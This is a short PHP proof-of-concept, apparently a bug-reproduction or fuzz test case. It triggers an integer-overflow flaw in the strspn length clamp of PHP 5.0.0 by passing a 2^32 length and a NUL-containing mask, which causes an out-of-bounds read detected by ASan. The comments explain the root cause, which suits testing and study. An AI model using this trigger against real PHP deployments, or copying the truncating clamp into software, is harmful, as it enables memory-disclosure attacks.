<?php
/* strspn/strcspn clamp integer overflow (php_spn_common_handler @ ext/standard/string.c)
   At 5.0.0 the clamp is: if (((unsigned)start + (unsigned)len) > len1) len = len1 - start;
   With len = 2^32 (a long), (unsigned)len truncates to 0, so the clamp is bypassed and the
   requested span end pointer s11+start+len runs ~4GB past the buffer.  A mask that contains
   the NUL byte lets php_strspn walk past the string's own terminator into the ASan redzone. */
$s = str_repeat("A", 16);
$mask = "A\0";                 // NUL in mask -> scan does not stop at the string terminator
strspn($s, $mask, 0, 4294967296);
echo "done\n";
